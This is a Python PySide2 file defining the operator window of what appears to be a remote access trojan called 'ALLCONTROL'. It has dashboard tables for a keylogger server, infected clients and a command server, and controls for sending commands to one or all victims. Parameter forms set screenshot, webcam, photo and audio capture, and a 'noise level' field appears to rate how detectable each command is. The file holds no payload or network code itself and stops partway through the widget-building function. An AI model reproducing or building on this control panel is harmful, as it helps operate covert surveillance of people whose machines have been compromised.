# -*- coding: utf-8 -*-

################################################################################
## Form generated from reading UI file 'mainWindowGVnCpS.ui'
##
## Created by: Qt User Interface Compiler version 5.15.2
##
## WARNING! All changes made in this file will be lost when recompiling UI file!
################################################################################

from PySide2.QtCore import *
from PySide2.QtGui import *
from PySide2.QtWidgets import *
import ServerDatabase

import resources_rc

class Ui_ALLCONTROL_SERVER(QMainWindow):

    databaseHandle = ServerDatabase.DataBase()
    commandParametersForm = dict()  # Holds a key with an associated list value. The lists are [QWidgets, Parametervalues

    def __init__(self):
        super().__init__()
        self.font = QFont()
        self.font.setFamily(u"Segoe UI Black")
        self.font.setPointSize(16)
        self.font.setBold(True)
        self.font.setWeight(75)
        self.setupUi()

    def setupUi(self):
        if not self.objectName():
            self.setObjectName(u"ALLCONTROL_SERVER")

#-------- Paste update here ----------------------------------------------------------------------------------------------

        self.resize(1676, 1074)
        self.centralwidget = QWidget(self)
        self.centralwidget.setObjectName(u"centralwidget")
        self.tabs = QTabWidget(self.centralwidget)
        self.tabs.setObjectName(u"tabs")
        self.tabs.setGeometry(QRect(30, 20, 1611, 1011))
        font = QFont()
        font.setFamily(u"Segoe UI Black")
        font.setPointSize(16)
        font.setBold(True)
        font.setWeight(75)
        self.tabs.setFont(font)
        self.tabs.setMovable(True)
        self.tabs.setTabBarAutoHide(False)
        self.Dashboard = QWidget()
        self.Dashboard.setObjectName(u"Dashboard")
        self.Dashboard.setFont(font)
        self.verticalLayoutWidget_2 = QWidget(self.Dashboard)
        self.verticalLayoutWidget_2.setObjectName(u"verticalLayoutWidget_2")
        self.verticalLayoutWidget_2.setGeometry(QRect(430, 310, 371, 311))
        self.keyloggerServerGrid = QVBoxLayout(self.verticalLayoutWidget_2)
        self.keyloggerServerGrid.setObjectName(u"keyloggerServerGrid")
        self.keyloggerServerGrid.setContentsMargins(0, 0, 0, 0)
        self.keyloggerServerConnectedLabel = QLabel(self.verticalLayoutWidget_2)
        self.keyloggerServerConnectedLabel.setObjectName(u"keyloggerServerConnectedLabel")

        self.keyloggerServerGrid.addWidget(self.keyloggerServerConnectedLabel)

        self.connectedClientsKeyloggerServer = QTableWidget(self.verticalLayoutWidget_2)
        if (self.connectedClientsKeyloggerServer.columnCount() < 3):
            self.connectedClientsKeyloggerServer.setColumnCount(3)
        __qtablewidgetitem = QTableWidgetItem()
        self.connectedClientsKeyloggerServer.setHorizontalHeaderItem(0, __qtablewidgetitem)
        __qtablewidgetitem1 = QTableWidgetItem()
        self.connectedClientsKeyloggerServer.setHorizontalHeaderItem(1, __qtablewidgetitem1)
        __qtablewidgetitem2 = QTableWidgetItem()
        self.connectedClientsKeyloggerServer.setHorizontalHeaderItem(2, __qtablewidgetitem2)
        self.connectedClientsKeyloggerServer.setObjectName(u"connectedClientsKeyloggerServer")
        font1 = QFont()
        font1.setFamily(u"Segoe UI Black")
        font1.setPointSize(12)
        font1.setBold(True)
        font1.setWeight(75)
        self.connectedClientsKeyloggerServer.setFont(font1)

        self.keyloggerServerGrid.addWidget(self.connectedClientsKeyloggerServer)

        self.verticalLayoutWidget_3 = QWidget(self.Dashboard)
        self.verticalLayoutWidget_3.setObjectName(u"verticalLayoutWidget_3")
        self.verticalLayoutWidget_3.setGeometry(QRect(820, 310, 771, 311))
        self.infectedClientsGrid = QVBoxLayout(self.verticalLayoutWidget_3)
        self.infectedClientsGrid.setObjectName(u"infectedClientsGrid")
        self.infectedClientsGrid.setContentsMargins(0, 0, 0, 0)
        self.infectedClientsLabel = QLabel(self.verticalLayoutWidget_3)
        self.infectedClientsLabel.setObjectName(u"infectedClientsLabel")

        self.infectedClientsGrid.addWidget(self.infectedClientsLabel)

        self.infectedClients = QTableWidget(self.verticalLayoutWidget_3)
        if (self.infectedClients.columnCount() < 17):
            self.infectedClients.setColumnCount(17)
        __qtablewidgetitem3 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(0, __qtablewidgetitem3)
        __qtablewidgetitem4 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(1, __qtablewidgetitem4)
        __qtablewidgetitem5 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(2, __qtablewidgetitem5)
        __qtablewidgetitem6 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(3, __qtablewidgetitem6)
        __qtablewidgetitem7 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(4, __qtablewidgetitem7)
        __qtablewidgetitem8 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(5, __qtablewidgetitem8)
        __qtablewidgetitem9 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(6, __qtablewidgetitem9)
        __qtablewidgetitem10 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(7, __qtablewidgetitem10)
        __qtablewidgetitem11 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(8, __qtablewidgetitem11)
        __qtablewidgetitem12 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(9, __qtablewidgetitem12)
        __qtablewidgetitem13 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(10, __qtablewidgetitem13)
        __qtablewidgetitem14 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(11, __qtablewidgetitem14)
        __qtablewidgetitem15 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(12, __qtablewidgetitem15)
        __qtablewidgetitem16 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(13, __qtablewidgetitem16)
        __qtablewidgetitem17 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(14, __qtablewidgetitem17)
        __qtablewidgetitem18 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(15, __qtablewidgetitem18)
        __qtablewidgetitem19 = QTableWidgetItem()
        self.infectedClients.setHorizontalHeaderItem(16, __qtablewidgetitem19)
        self.infectedClients.setObjectName(u"infectedClients")
        self.infectedClients.setFont(font)
        self.infectedClients.horizontalHeader().setCascadingSectionResizes(False)
        self.infectedClients.horizontalHeader().setMinimumSectionSize(56)
        self.infectedClients.horizontalHeader().setDefaultSectionSize(100)

        self.infectedClientsGrid.addWidget(self.infectedClients)

        self.verticalLayoutWidget = QWidget(self.Dashboard)
        self.verticalLayoutWidget.setObjectName(u"verticalLayoutWidget")
        self.verticalLayoutWidget.setGeometry(QRect(20, 310, 391, 311))
        self.commandServerGrid = QVBoxLayout(self.verticalLayoutWidget)
        self.commandServerGrid.setObjectName(u"commandServerGrid")
        self.commandServerGrid.setContentsMargins(0, 0, 0, 0)
        self.commandServerConnectedLabel = QLabel(self.verticalLayoutWidget)
        self.commandServerConnectedLabel.setObjectName(u"commandServerConnectedLabel")

        self.commandServerGrid.addWidget(self.commandServerConnectedLabel)

        self.connectedClientsCommandServer = QTableWidget(self.verticalLayoutWidget)
        if (self.connectedClientsCommandServer.columnCount() < 3):
            self.connectedClientsCommandServer.setColumnCount(3)
        __qtablewidgetitem20 = QTableWidgetItem()
        self.connectedClientsCommandServer.setHorizontalHeaderItem(0, __qtablewidgetitem20)
        __qtablewidgetitem21 = QTableWidgetItem()
        self.connectedClientsCommandServer.setHorizontalHeaderItem(1, __qtablewidgetitem21)
        __qtablewidgetitem22 = QTableWidgetItem()
        self.connectedClientsCommandServer.setHorizontalHeaderItem(2, __qtablewidgetitem22)
        self.connectedClientsCommandServer.setObjectName(u"connectedClientsCommandServer")
        self.connectedClientsCommandServer.setFont(font1)

        self.commandServerGrid.addWidget(self.connectedClientsCommandServer)

        self.verticalLayoutWidget_4 = QWidget(self.Dashboard)
        self.verticalLayoutWidget_4.setObjectName(u"verticalLayoutWidget_4")
        self.verticalLayoutWidget_4.setGeometry(QRect(20, 90, 561, 191))
        self.infoGrid = QVBoxLayout(self.verticalLayoutWidget_4)
        self.infoGrid.setObjectName(u"infoGrid")
        self.infoGrid.setContentsMargins(0, 0, 0, 0)
        self.label = QLabel(self.verticalLayoutWidget_4)
        self.label.setObjectName(u"label")
        self.label.setTextFormat(Qt.AutoText)
        self.label.setScaledContents(False)
        self.label.setAlignment(Qt.AlignLeading|Qt.AlignLeft|Qt.AlignVCenter)
        self.label.setWordWrap(False)
        self.label.setMargin(0)
        self.label.setIndent(0)
        self.label.setTextInteractionFlags(Qt.NoTextInteraction)

        self.infoGrid.addWidget(self.label)

        self.infoTable = QTableWidget(self.verticalLayoutWidget_4)
        if (self.infoTable.columnCount() < 1):
            self.infoTable.setColumnCount(1)
        if (self.infoTable.rowCount() < 4):
            self.infoTable.setRowCount(4)
        __qtablewidgetitem23 = QTableWidgetItem()
        self.infoTable.setVerticalHeaderItem(0, __qtablewidgetitem23)
        __qtablewidgetitem24 = QTableWidgetItem()
        self.infoTable.setVerticalHeaderItem(1, __qtablewidgetitem24)
        __qtablewidgetitem25 = QTableWidgetItem()
        self.infoTable.setVerticalHeaderItem(2, __qtablewidgetitem25)
        __qtablewidgetitem26 = QTableWidgetItem()
        self.infoTable.setVerticalHeaderItem(3, __qtablewidgetitem26)
        self.infoTable.setObjectName(u"infoTable")
        self.infoTable.setFont(font)
        self.infoTable.setSizeAdjustPolicy(QAbstractScrollArea.AdjustToContents)
        self.infoTable.setAlternatingRowColors(True)
        self.infoTable.setSortingEnabled(True)
        self.infoTable.setRowCount(4)
        self.infoTable.setColumnCount(1)
        self.infoTable.horizontalHeader().setVisible(False)
        self.infoTable.horizontalHeader().setCascadingSectionResizes(False)
        self.infoTable.horizontalHeader().setDefaultSectionSize(100)
        self.infoTable.horizontalHeader().setHighlightSections(True)
        self.infoTable.horizontalHeader().setStretchLastSection(True)
        self.infoTable.verticalHeader().setVisible(True)
        self.infoTable.verticalHeader().setHighlightSections(True)
        self.infoTable.verticalHeader().setStretchLastSection(False)

        self.infoGrid.addWidget(self.infoTable)

        self.verticalLayoutWidget_5 = QWidget(self.Dashboard)
        self.verticalLayoutWidget_5.setObjectName(u"verticalLayoutWidget_5")
        self.verticalLayoutWidget_5.setGeometry(QRect(610, 90, 971, 191))
        self.securityInfoGrid = QVBoxLayout(self.verticalLayoutWidget_5)
        self.securityInfoGrid.setObjectName(u"securityInfoGrid")
        self.securityInfoGrid.setContentsMargins(0, 0, 0, 0)
        self.securityLabel = QLabel(self.verticalLayoutWidget_5)
        self.securityLabel.setObjectName(u"securityLabel")

        self.securityInfoGrid.addWidget(self.securityLabel)

        self.securityTable = QTableWidget(self.verticalLayoutWidget_5)
        if (self.securityTable.columnCount() < 2):
            self.securityTable.setColumnCount(2)
        __qtablewidgetitem27 = QTableWidgetItem()
        self.securityTable.setHorizontalHeaderItem(0, __qtablewidgetitem27)
        __qtablewidgetitem28 = QTableWidgetItem()
        self.securityTable.setHorizontalHeaderItem(1, __qtablewidgetitem28)
        self.securityTable.setObjectName(u"securityTable")
        self.securityTable.setAlternatingRowColors(True)
        self.securityTable.setSortingEnabled(True)
        self.securityTable.setRowCount(0)
        self.securityTable.setColumnCount(2)
        self.securityTable.horizontalHeader().setVisible(False)
        self.securityTable.horizontalHeader().setCascadingSectionResizes(False)
        self.securityTable.horizontalHeader().setDefaultSectionSize(100)
        self.securityTable.horizontalHeader().setHighlightSections(True)
        self.securityTable.horizontalHeader().setStretchLastSection(True)
        self.securityTable.verticalHeader().setVisible(False)
        self.securityTable.verticalHeader().setHighlightSections(True)

        self.securityInfoGrid.addWidget(self.securityTable)

        self.verticalLayoutWidget_6 = QWidget(self.Dashboard)
        self.verticalLayoutWidget_6.setObjectName(u"verticalLayoutWidget_6")
        self.verticalLayoutWidget_6.setGeometry(QRect(20, 640, 1571, 311))
        self.logsGrid = QVBoxLayout(self.verticalLayoutWidget_6)
        self.logsGrid.setObjectName(u"logsGrid")
        self.logsGrid.setContentsMargins(0, 0, 0, 0)
        self.logsLabel = QLabel(self.verticalLayoutWidget_6)
        self.logsLabel.setObjectName(u"logsLabel")

        self.logsGrid.addWidget(self.logsLabel)

        self.logsTable = QTableWidget(self.verticalLayoutWidget_6)
        if (self.logsTable.columnCount() < 3):
            self.logsTable.setColumnCount(3)
        __qtablewidgetitem29 = QTableWidgetItem()
        self.logsTable.setHorizontalHeaderItem(0, __qtablewidgetitem29)
        __qtablewidgetitem30 = QTableWidgetItem()
        self.logsTable.setHorizontalHeaderItem(1, __qtablewidgetitem30)
        __qtablewidgetitem31 = QTableWidgetItem()
        self.logsTable.setHorizontalHeaderItem(2, __qtablewidgetitem31)
        self.logsTable.setObjectName(u"logsTable")
        self.logsTable.setFont(font1)
        self.logsTable.setGridStyle(Qt.DashLine)
        self.logsTable.horizontalHeader().setMinimumSectionSize(44)
        self.logsTable.horizontalHeader().setDefaultSectionSize(117)
        self.logsTable.horizontalHeader().setStretchLastSection(True)
        self.logsTable.verticalHeader().setStretchLastSection(False)

        self.logsGrid.addWidget(self.logsTable)

        self.bannerLabel = QLabel(self.Dashboard)
        self.bannerLabel.setObjectName(u"bannerLabel")
        self.bannerLabel.setGeometry(QRect(690, 0, 181, 91))
        self.bannerLabel.setPixmap(QPixmap(u":/banner/images/ALLCONTROL Banner.png"))
        self.bannerLabel.setScaledContents(True)
        self.tabs.addTab(self.Dashboard, "")
        self.Operations = QWidget()
        self.Operations.setObjectName(u"Operations")
        self.connectedClientsSearch = QFrame(self.Operations)
        self.connectedClientsSearch.setObjectName(u"connectedClientsSearch")
        self.connectedClientsSearch.setGeometry(QRect(10, 20, 1581, 391))
        self.connectedClientsSearch.setFrameShape(QFrame.StyledPanel)
        self.connectedClientsSearch.setFrameShadow(QFrame.Plain)
        self.verticalLayoutWidget_8 = QWidget(self.connectedClientsSearch)
        self.verticalLayoutWidget_8.setObjectName(u"verticalLayoutWidget_8")
        self.verticalLayoutWidget_8.setGeometry(QRect(10, 10, 1261, 291))
        self.connectedClientsGrid = QVBoxLayout(self.verticalLayoutWidget_8)
        self.connectedClientsGrid.setObjectName(u"connectedClientsGrid")
        self.connectedClientsGrid.setContentsMargins(0, 0, 0, 0)
        self.connectedClientsLabel = QLabel(self.verticalLayoutWidget_8)
        self.connectedClientsLabel.setObjectName(u"connectedClientsLabel")
        self.connectedClientsLabel.setFont(font)
        self.connectedClientsLabel.setTextFormat(Qt.AutoText)

        self.connectedClientsGrid.addWidget(self.connectedClientsLabel)

        self.connectedClients = QTableWidget(self.verticalLayoutWidget_8)
        if (self.connectedClients.columnCount() < 17):
            self.connectedClients.setColumnCount(17)
        __qtablewidgetitem32 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(0, __qtablewidgetitem32)
        __qtablewidgetitem33 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(1, __qtablewidgetitem33)
        __qtablewidgetitem34 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(2, __qtablewidgetitem34)
        __qtablewidgetitem35 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(3, __qtablewidgetitem35)
        __qtablewidgetitem36 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(4, __qtablewidgetitem36)
        __qtablewidgetitem37 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(5, __qtablewidgetitem37)
        __qtablewidgetitem38 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(6, __qtablewidgetitem38)
        __qtablewidgetitem39 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(7, __qtablewidgetitem39)
        __qtablewidgetitem40 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(8, __qtablewidgetitem40)
        __qtablewidgetitem41 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(9, __qtablewidgetitem41)
        __qtablewidgetitem42 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(10, __qtablewidgetitem42)
        __qtablewidgetitem43 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(11, __qtablewidgetitem43)
        __qtablewidgetitem44 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(12, __qtablewidgetitem44)
        __qtablewidgetitem45 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(13, __qtablewidgetitem45)
        __qtablewidgetitem46 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(14, __qtablewidgetitem46)
        __qtablewidgetitem47 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(15, __qtablewidgetitem47)
        __qtablewidgetitem48 = QTableWidgetItem()
        self.connectedClients.setHorizontalHeaderItem(16, __qtablewidgetitem48)
        self.connectedClients.setObjectName(u"connectedClients")
        self.connectedClients.setFont(font)

        self.connectedClientsGrid.addWidget(self.connectedClients)

        self.filterFrame = QFrame(self.connectedClientsSearch)
        self.filterFrame.setObjectName(u"filterFrame")
        self.filterFrame.setGeometry(QRect(10, 310, 993, 63))
        self.filterFrame.setMaximumSize(QSize(16777215, 16777215))
        self.filterFrame.setSizeIncrement(QSize(0, 0))
        self.filterFrame.setFrameShape(QFrame.StyledPanel)
        self.filterFrame.setFrameShadow(QFrame.Plain)
        self.valueLabel = QLabel(self.filterFrame)
        self.valueLabel.setObjectName(u"valueLabel")
        self.valueLabel.setGeometry(QRect(350, 9, 71, 41))
        self.valueLabel.setFont(font)
        self.valueLabel.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)
        self.fieldLabel = QLabel(self.filterFrame)
        self.fieldLabel.setObjectName(u"fieldLabel")
        self.fieldLabel.setGeometry(QRect(10, 4, 61, 51))
        self.fieldLabel.setFont(font)
        self.fieldLabel.setMouseTracking(False)
        self.fieldLabel.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)
        self.applyButton = QPushButton(self.filterFrame)
        self.applyButton.setObjectName(u"applyButton")
        self.applyButton.setGeometry(QRect(850, 14, 121, 38))
        self.applyButton.setFont(font)
        icon = QIcon()
        icon.addFile(u":/icon/images/filter.png", QSize(), QIcon.Normal, QIcon.Off)
        self.applyButton.setIcon(icon)
        self.applyButton.setIconSize(QSize(25, 25))
        self.fieldComboBox = QComboBox(self.filterFrame)
        self.fieldComboBox.setObjectName(u"fieldComboBox")
        self.fieldComboBox.setGeometry(QRect(80, 14, 245, 36))
        self.fieldComboBox.setFont(font)
        self.textEdit = QTextEdit(self.filterFrame)
        self.textEdit.setObjectName(u"textEdit")
        self.textEdit.setGeometry(QRect(430, 14, 401, 37))
        font2 = QFont()
        font2.setFamily(u"Segoe UI Black")
        font2.setPointSize(14)
        font2.setBold(True)
        font2.setWeight(75)
        self.textEdit.setFont(font2)
        self.verticalLayoutWidget_7 = QWidget(self.connectedClientsSearch)
        self.verticalLayoutWidget_7.setObjectName(u"verticalLayoutWidget_7")
        self.verticalLayoutWidget_7.setGeometry(QRect(1290, 10, 271, 291))
        self.ScheduledCommandsGrid = QVBoxLayout(self.verticalLayoutWidget_7)
        self.ScheduledCommandsGrid.setObjectName(u"ScheduledCommandsGrid")
        self.ScheduledCommandsGrid.setContentsMargins(0, 0, 0, 0)
        self.scheduledCommandsLabel = QLabel(self.verticalLayoutWidget_7)
        self.scheduledCommandsLabel.setObjectName(u"scheduledCommandsLabel")
        self.scheduledCommandsLabel.setFont(font)

        self.ScheduledCommandsGrid.addWidget(self.scheduledCommandsLabel)

        self.scheduledCommands = QTableView(self.verticalLayoutWidget_7)
        self.scheduledCommands.setObjectName(u"scheduledCommands")
        self.scheduledCommands.setFont(font)

        self.ScheduledCommandsGrid.addWidget(self.scheduledCommands)

        self.optionsGroupBox = QGroupBox(self.Operations)
        self.optionsGroupBox.setObjectName(u"optionsGroupBox")
        self.optionsGroupBox.setGeometry(QRect(11, 560, 651, 101))
        self.optionsGroupBox.setFont(font)
        self.sendToAllCheckBox = QCheckBox(self.optionsGroupBox)
        self.sendToAllCheckBox.setObjectName(u"sendToAllCheckBox")
        self.sendToAllCheckBox.setGeometry(QRect(500, 46, 131, 31))
        self.sendToAllCheckBox.setFont(font)
        self.targetClientIDComboBox = QComboBox(self.optionsGroupBox)
        self.targetClientIDComboBox.setObjectName(u"targetClientIDComboBox")
        self.targetClientIDComboBox.setGeometry(QRect(240, 44, 231, 35))
        self.targetClientIDComboBox.setFont(font)
        self.targetLabel = QLabel(self.optionsGroupBox)
        self.targetLabel.setObjectName(u"targetLabel")
        self.targetLabel.setGeometry(QRect(40, 35, 191, 51))
        self.targetLabel.setFont(font)
        self.commandGroupBox = QGroupBox(self.Operations)
        self.commandGroupBox.setObjectName(u"commandGroupBox")
        self.commandGroupBox.setGeometry(QRect(11, 440, 1581, 101))
        self.commandGroupBox.setFont(font)
        self.commandNameLabel = QLabel(self.commandGroupBox)
        self.commandNameLabel.setObjectName(u"commandNameLabel")
        self.commandNameLabel.setGeometry(QRect(2, 21, 122, 79))
        self.commandNameLabel.setFont(font)
        self.commandNameLabel.setTextFormat(Qt.AutoText)
        self.commandNameLabel.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)
        self.commandDescriptionLabel = QLabel(self.commandGroupBox)
        self.commandDescriptionLabel.setObjectName(u"commandDescriptionLabel")
        self.commandDescriptionLabel.setGeometry(QRect(381, 20, 131, 79))
        self.commandDescriptionLabel.setFont(font)
        self.commandDescriptionLabel.setTextFormat(Qt.AutoText)
        self.commandDescriptionLabel.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)
        self.commandNameComboBox = QComboBox(self.commandGroupBox)
        self.commandNameComboBox.setObjectName(u"commandNameComboBox")
        self.commandNameComboBox.setGeometry(QRect(130, 45, 231, 36))
        self.commandNameComboBox.setFont(font)
        self.noiseLevelLabel = QLabel(self.commandGroupBox)
        self.noiseLevelLabel.setObjectName(u"noiseLevelLabel")
        self.noiseLevelLabel.setGeometry(QRect(760, 20, 131, 79))
        self.noiseLevelLabel.setFont(font)
        self.noiseLevelLabel.setTextFormat(Qt.AutoText)
        self.noiseLevelLabel.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)
        self.commandDescription = QPlainTextEdit(self.commandGroupBox)
        self.commandDescription.setObjectName(u"commandDescription")
        self.commandDescription.setGeometry(QRect(520, 30, 231, 61))
        self.commandDescription.setFont(font1)
        self.commandDescription.setReadOnly(True)
        self.noiseLevel = QPlainTextEdit(self.commandGroupBox)
        self.noiseLevel.setObjectName(u"noiseLevel")
        self.noiseLevel.setGeometry(QRect(900, 40, 61, 41))
        self.noiseLevel.setFont(font2)
        self.noiseLevel.setSizeAdjustPolicy(QAbstractScrollArea.AdjustToContents)
        self.noiseLevel.setReadOnly(True)
        self.sendCommandButton = QPushButton(self.commandGroupBox)
        self.sendCommandButton.setObjectName(u"sendCommandButton")
        self.sendCommandButton.setGeometry(QRect(1340, 40, 131, 41))
        self.sendCommandButton.setFont(font)
        icon1 = QIcon()
        icon1.addFile(u":/icon/images/Send.png", QSize(), QIcon.Normal, QIcon.Off)
        self.sendCommandButton.setIcon(icon1)
        self.sendCommandButton.setIconSize(QSize(50, 50))
        self.commandParametersGroupBox = QGroupBox(self.Operations)
        self.commandParametersGroupBox.setObjectName(u"commandParametersGroupBox")
        self.commandParametersGroupBox.setGeometry(QRect(10, 680, 651, 241))
        self.commandParametersGroupBox.setFont(font)
        self.verticalScrollBar = QScrollBar(self.commandParametersGroupBox)
        self.verticalScrollBar.setObjectName(u"verticalScrollBar")
        self.verticalScrollBar.setGeometry(QRect(620, 20, 20, 211))
        self.verticalScrollBar.setOrientation(Qt.Vertical)
        self.commandParametersWidget = QWidget(self.commandParametersGroupBox)

        self.commandParametersWidget.setObjectName(u"commandParametersWidget")
        self.commandParametersWidget.setGeometry(29, 50, 561, 161)



        self.previewFrame = QFrame(self.Operations)
        self.previewFrame.setObjectName(u"previewFrame")
        self.previewFrame.setGeometry(QRect(710, 570, 640, 360))
        self.previewFrame.setAutoFillBackground(True)
        self.previewFrame.setFrameShape(QFrame.StyledPanel)
        self.previewFrame.setFrameShadow(QFrame.Plain)
        self.previewControls = QGroupBox(self.Operations)
        self.previewControls.setObjectName(u"previewControls")
        self.previewControls.setGeometry(QRect(1370, 570, 51, 361))
        self.tabs.addTab(self.Operations, "")
        self.database = QWidget()
        self.database.setObjectName(u"database")
        self.tabs.addTab(self.database, "")
        self.Configurations = QWidget()
        self.Configurations.setObjectName(u"Configurations")
        self.tabs.addTab(self.Configurations, "")
        self.Logs = QWidget()
        self.Logs.setObjectName(u"Logs")
        self.tabs.addTab(self.Logs, "")
        self.logoFooterLabel = QLabel(self.centralwidget)
        self.logoFooterLabel.setObjectName(u"logoFooterLabel")
        self.logoFooterLabel.setGeometry(QRect(830, 1030, 41, 41))
        self.logoFooterLabel.setPixmap(QPixmap(u":/icon/images/ALLCONTROL LOGO.png"))
        self.logoFooterLabel.setScaledContents(True)
        self.setCentralWidget(self.centralwidget)

#------ Paste ends when retranslateUi() is called in pydesigner code

        commandParametersGrid = QGridLayout()
        commandParametersGrid.setObjectName(u"commandParametersGrid")
        commandParametersGrid.setContentsMargins(0, 0, 0, 0)

        self.commandParametersWidget.setLayout(commandParametersGrid)
        self.commandNameComboBox.currentIndexChanged.connect(self.loadCommandParameters)

        self.retranslateUi()

        self.tabs.setCurrentIndex(0)


        QMetaObject.connectSlotsByName(self)
    # setupUi

    def loadCommandParameters(self):
        # To Do
        # Get all command parameters from command name in combobox.
        # Should get command parameter name, and widget type.
        # Create form from the command paramters
        # Add created widgets to the member list self.commandParametersForm

        command_parameters = self.databaseHandle.get_command_parameter(self.commandNameComboBox.currentText())
        if self.commandParametersForm is not None:
            # Clear current Widgets and forms.
            self.clearWidgets()
        print(f'command parameters - {command_parameters}')
        if command_parameters is not None:
            for command in command_parameters:
                self.createWidget(command)

    def updateLabel(self, label, value):
        label.setText(str(value))


    def createWidget(self, command_parameter):
        if command_parameter[1] == 'Screenshot Quantity':
            # Create Widgets
            #Screenshot Quantity Widget:
            screenshotQuantityNameLabel = QLabel(f'{command_parameter[1]}:')
            screenshotQuantityNameLabel.setFont(self.font)  # Parameter name
            screenshotQuantitySlider = QSlider()  # Slider
            screenshotQuantitySlider.setOrientation(Qt.Horizontal)
            value_label = QLabel('1', self)
            value_label.setFont(self.font) # Shows slider value for user
            screenshotQuantitySlider.valueChanged.connect(lambda : self.updateLabel(value_label, screenshotQuantitySlider.value()))
            screenshotQuantitySlider.setMinimum(1)
            screenshotQuantitySlider.setMaximum(25)
            screenshotQuantitySlider.setFont(self.font)

            # Add Widgets to layout
            self.commandParametersWidget.layout().addWidget(screenshotQuantityNameLabel, 0, 0)
            self.commandParametersWidget.layout().addWidget(screenshotQuantitySlider, 0, 1)
            self.commandParametersWidget.layout().addWidget(value_label, 0, 2)


            # Add widget to dictionary
            self.commandParametersForm[command_parameter[1]] = screenshotQuantitySlider

        elif command_parameter[1] == 'Screenshot Time Interval':
            # Time interval Widget:
            timeIntervalNameLabel = QLabel(f'{command_parameter[1]}:')
            timeIntervalNameLabel.setFont(self.font)  # Parameter name
            timeIntervalSlider = QSlider()  # Slider
            timeIntervalSlider.setOrientation(Qt.Horizontal)
            timeIntervalValueLabel = QLabel('1 Second', self)
            timeIntervalValueLabel.setFont(self.font) # Shows slider value for user
            timeIntervalSlider.valueChanged.connect(lambda : self.updateLabel(timeIntervalValueLabel, f'{timeIntervalSlider.value()} Seconds'))
            timeIntervalSlider.setMinimum(1)
            timeIntervalSlider.setMaximum(30)
            timeIntervalSlider.setFont(self.font)

            self.commandParametersWidget.layout().addWidget(timeIntervalNameLabel, 1, 0)
            self.commandParametersWidget.layout().addWidget(timeIntervalSlider, 1, 1)
            self.commandParametersWidget.layout().addWidget(timeIntervalValueLabel, 1, 2)

            # Add widget to dictionary
            self.commandParametersForm[command_parameter[1]] = timeIntervalSlider

        elif command_parameter[1] == 'Webcam Time Interval':
            # Time interval Widget:
            timeIntervalNameLabel = QLabel(f'{command_parameter[1]}:')
            timeIntervalNameLabel.setFont(self.font)  # Parameter name
            timeIntervalSlider = QSlider()  # Slider
            timeIntervalSlider.setOrientation(Qt.Horizontal)
            timeIntervalValueLabel = QLabel('1', self)
            timeIntervalValueLabel.setFont(self.font) # Shows slider value for user
            timeIntervalSlider.valueChanged.connect(lambda : self.updateLabel(timeIntervalValueLabel, timeIntervalSlider.value()))
            timeIntervalSlider.setMinimum(1)
            timeIntervalSlider.setMaximum(30)
            timeIntervalSlider.setFont(self.font)

            self.commandParametersWidget.layout().addWidget(timeIntervalNameLabel, 1, 0)
            self.commandParametersWidget.layout().addWidget(timeIntervalSlider, 1, 1)
            self.commandParametersWidget.layout().addWidget(timeIntervalValueLabel, 1, 2)

            # Add widget to dictionary
            self.commandParametersForm[command_parameter[1]] = timeIntervalSlider

        elif command_parameter[1] == 'Photo Quantity':

            photoQuantityNameLabel = QLabel(f'{command_parameter[1]}:')
            photoQuantityNameLabel.setFont(self.font)
            photoQuantitySlider = QSlider()
            photoQuantitySlider.setOrientation(Qt.Horizontal)
            value_label = QLabel('1', self)
            value_label.setFont(self.font)
            photoQuantitySlider.valueChanged.connect(lambda : self.updateLabel(value_label, photoQuantitySlider.value()))
            photoQuantitySlider.setMinimum(1)
            photoQuantitySlider.setMaximum(25)
            photoQuantitySlider.setFont(self.font)

            photoQuantitySlider.setFixedSize(231, 36)

            self.commandParametersWidget.layout().addWidget(photoQuantityNameLabel, 0, 0)
            self.commandParametersWidget.layout().addWidget(photoQuantitySlider, 0, 1)
            self.commandParametersWidget.layout().addWidget(value_label, 0, 2)

            self.commandParametersForm[command_parameter[1]] = photoQuantitySlider  # Appends record to dictionary.
            # The key is the widget name and the value is the widget

        elif command_parameter[1] == 'Audio Duration':
            audioDurationNameLabel = QLabel(f'{command_parameter[1]}:')
            audioDurationNameLabel.setFont(self.font)
            audioDurationSlider = QSlider()
